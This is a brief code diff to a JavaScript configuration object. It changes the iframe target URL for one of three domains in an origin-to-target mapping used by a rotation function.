@@ -85,7 +85,7 @@ async function getRotationTarget(key) {
 //                    embed it in an iframe (target is ignored)
 const ORIGIN_GROUPS = {
   rocky: {
-    "https://naotoshidairy.com": { method: "iframe", target: "https://v2-test_environment-926am.on-forge.com" },
+    "https://naotoshidairy.com": { method: "iframe", target: "https://two-v2-test-environment.onrender.com" },
     "https://takahirofarmfood.com": { method: "iframe", target: "https://v2-test_environment-926am.on-forge.com" },
     "https://hiroakitravels.com": { method: "iframe", target: "https://v2-test_environment-926am.on-forge.com" },
   },
